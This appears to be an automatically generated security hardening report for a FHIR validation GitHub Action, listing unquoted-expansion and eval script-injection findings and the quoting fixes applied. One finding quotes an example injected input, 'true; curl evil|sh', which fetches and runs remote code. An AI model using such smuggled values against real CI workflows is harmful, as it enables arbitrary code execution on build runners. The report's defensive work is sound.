<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.17

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.17** was hardened automatically. 23 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): the step 'Check if .NET is installed' expands workflow-controlled inputs unquoted and runs them as commands: `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`. The input value becomes the command that runs, so a value like `true; curl evil|sh` runs arbitrary code. The same `if $INPUT_*_ENABLED;` pattern appears in almost every step of this action. Compare with quotes instead, e.g. `[[ "$VAR" == "true" ]]`.

Locations:

- `action.yml:90`

### script-injection (severity: high)

Rule (b): the step 'Check .NET SDK Version' has an unquoted expansion that also runs as a command: `if $INPUT_DOTNET_VALIDATION_ENABLED; then`.

Locations:

- `action.yml:105`

### script-injection (severity: high)

Rule (b): the step 'Install Firely.Terminal' has `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then` and `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION`. Both expand inputs unquoted.

Locations:

- `action.yml:116`
- `action.yml:119`

### script-injection (severity: high)

Rule (b): the step 'Check Firely Terminal Version' has an unquoted expansion that runs as a command: `if $INPUT_DOTNET_VALIDATION_ENABLED; then`.

Locations:

- `action.yml:131`

### script-injection (severity: high)

Rule (b): the step 'Simplifier login' has `if $INPUT_DOTNET_VALIDATION_ENABLED; then` and `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`. Both expand inputs unquoted.

Locations:

- `action.yml:142`
- `action.yml:143`

### script-injection (severity: high)

Rule (b): the step 'Detect FHIR version and determine dependency source' runs inputs as commands through unquoted expansions: `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_JAVA_VALIDATION_ENABLED; then`, `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then` and `elif $INPUT_SUSHI_ENABLED && ...`.

Locations:

- `action.yml:168`
- `action.yml:183`
- `action.yml:202`

### script-injection (severity: high)

Rule (b): the step 'Validate FHIR version support' has an unquoted expansion: `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_JAVA_VALIDATION_ENABLED; then`.

Locations:

- `action.yml:285`

### script-injection (severity: high)

Rule (b): the step 'Set FHIR specification and restore dependencies' has an unquoted expansion: `if $INPUT_DOTNET_VALIDATION_ENABLED; then`.

Locations:

- `action.yml:363`

### script-injection (severity: high)

Rule (b): the step 'Check if npm is installed' has an unquoted expansion: `if $INPUT_SUSHI_ENABLED; then`.

Locations:

- `action.yml:487`

### script-injection (severity: high)

Rule (b): the step 'Check npm Version' has an unquoted expansion: `if $INPUT_SUSHI_ENABLED; then`.

Locations:

- `action.yml:500`

### script-injection (severity: high)

Rule (b): the step 'Install fsh-sushi' has `if $INPUT_SUSHI_ENABLED; then`, `sudo chown -R $USER ...` and `sudo npm install -g fsh-sushi@$SUSHI_VERSION`. All three are unquoted, and SUSHI_VERSION is an input.

Locations:

- `action.yml:510`
- `action.yml:512`

### script-injection (severity: high)

Rule (b): the step 'Check SUSHI version' has an unquoted expansion: `if $INPUT_SUSHI_ENABLED; then`.

Locations:

- `action.yml:521`

### script-injection (severity: high)

Rule (b): the step 'Generate conformance resources with SUSHI' has `if $INPUT_SUSHI_ENABLED; then` and `sushi $INPUT_SUSHI_OPTIONS`. Both expand inputs unquoted.

Locations:

- `action.yml:530`
- `action.yml:531`

### script-injection (severity: high)

Rule (b): the step 'Pre-processing FHIR profiles (Slicing open-closed)' has an unquoted expansion that runs as a command: `if $CLOSE_SLICING_FOR_VALIDATION; then`.

Locations:

- `action.yml:544`

### script-injection (severity: high)

Rule (b): the step 'Configure Firely Terminal validator engine' has an unquoted expansion: `if $INPUT_DOTNET_VALIDATION_ENABLED; then`.

Locations:

- `action.yml:599`

### script-injection (severity: high)

Rule (b): the step 'Run Quality Control checks' has `if $INPUT_DOTNET_VALIDATION_ENABLED; then`, `if echo $INPUT_EXPECTED_FAILS | grep ...`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`. All expand inputs unquoted.

Locations:

- `action.yml:623`
- `action.yml:625`
- `action.yml:626`
- `action.yml:628`

### script-injection (severity: high)

Rule (b): the step 'Report Success - .NET Validator' has an unquoted expansion: `if $INPUT_DOTNET_VALIDATION_ENABLED; then`.

Locations:

- `action.yml:639`

### script-injection (severity: high)

Rule (b): the step 'Remove package cache to enable the Java validator to create snapshots' has an unquoted expansion: `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`.

Locations:

- `action.yml:656`

### script-injection (severity: high)

Rule (b): the step 'Check if Java is installed' has an unquoted expansion: `if $INPUT_JAVA_VALIDATION_ENABLED; then`.

Locations:

- `action.yml:666`

### script-injection (severity: high)

Rule (b): the step 'Download Java Validator' has `if $INPUT_JAVA_VALIDATION_ENABLED; then` and `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`, both unquoted. It also has `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`, which passes the workflow-controlled input `JAVA_VALIDATOR_DOWNLOAD_LOCATION` to eval, so any `$(...)` or `;` in the value is executed.

Locations:

- `action.yml:679`
- `action.yml:683`
- `action.yml:686`

### script-injection (severity: high)

Rule (b): the step 'Validate all conformance resources in scope of the repository' expands workflow-controlled data unquoted: `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `if echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $LOCAL_IG_PARAMETERS`.

Locations:

- `action.yml:704`
- `action.yml:727`
- `action.yml:742`
- `action.yml:743`
- `action.yml:745`

### script-injection (severity: high)

Rule (b): the step 'Validate all example resources in scope of the repository' expands workflow-controlled data unquoted: `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `if echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $COMBINED_IG_PARAMETERS`.

Locations:

- `action.yml:777`
- `action.yml:794`
- `action.yml:799`
- `action.yml:809`
- `action.yml:810`
- `action.yml:812`

### script-injection (severity: high)

Rule (b): the step 'Re-run SUSHI to restore conformance resources after slicing modification' has `if $CLOSE_SLICING_FOR_VALIDATION && $INPUT_SUSHI_ENABLED; then` and `sushi $INPUT_SUSHI_OPTIONS`. All three are inputs expanded unquoted.

Locations:

- `action.yml:840`
- `action.yml:842`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

All edits are in action.yml; nothing was run or tested.

- Yes/no checks: every `if $INPUT_X` (including `||`, `&&` and the `elif`) is now `[[ "$X" == "true" ]]`.
- Single values are quoted: the Firely Terminal version, `fsh-sushi@$SUSHI_VERSION`, `$USER` in the chown, the Simplifier login (`"email=$U" "password=$P"`) and the `rm -rf` cache path.
- The optional quality-control rules path is passed as `${VAR:+"$VAR"}`, so an empty value adds no argument.
- The EXPECTED_FAILS checks use `printf '%s\n' "$INPUT_EXPECTED_FAILS" | grep -w -q ...` instead of an unquoted echo.
- The `eval echo` on JAVA_VALIDATOR_DOWNLOAD_LOCATION is gone. The step now swaps the literal `${JAVA_VALIDATOR_VERSION}` / `$JAVA_VALIDATOR_VERSION` text for the version input, and wget gets the quoted URL.
- List inputs (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES and the -ig dependency list from package.json) are split with an unquoted array assignment `arr=($VAR)` and passed as `"${arr[@]}"`. This keeps upstream's whitespace split and wildcard expansion without running anything in the value.
- The -ig folder arguments are built as arrays, `*.xml` / `*.json` wildcards still expand, and `-version "$FHIR_VERSION"` is quoted.

Behaviour changes from upstream:
- Only the exact text `true` now counts as true. Upstream also treated an empty value as true; every one of these inputs has a default, so this only matters if a caller passes ''.
- Only the JAVA_VALIDATOR_VERSION placeholder is filled in the download URL. Upstream's eval would also have expanded any other variable or command in a custom URL. The default URL works the same.

### Iteration 2

**Fixes applied:** github-env-injection

**Notes:**

In the 'Detect FHIR version and determine dependency source' step, fhirVersion now goes through `printf '%s' "$fhirVersion" | tr -d '\n\r'` before it is written to $GITHUB_ENV as FHIR_VERSION. The other $GITHUB_ENV writes are true/false flags set by the script itself, so they did not need changing.

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

In action.yml I changed the shellcheck marker above the array assignments from SC2206 to SC2086 (9 places). These assignments are sushi_args, conformancePaths, examplePaths, javaOptions and igDependencyArgs. The arrays themselves are unchanged: they still split and glob the input exactly the way upstream's unquoted variable did, which is the exempt hardened form. Expanding a variable unquoted like this doesn't run anything inside it, so it can't inject commands.

I did not change the code behind the suspicious-run-content finding. The curl POST is upstream's own feature: it sends only package names from package.json to the official BfArM terminology server (terminologien.bfarm.de) to get a download token. Removing it would break the ZTS package restore. I added a comment above it explaining what it sends and why. The finding may still show up on the next analysis pass and will need someone to review it and accept it.

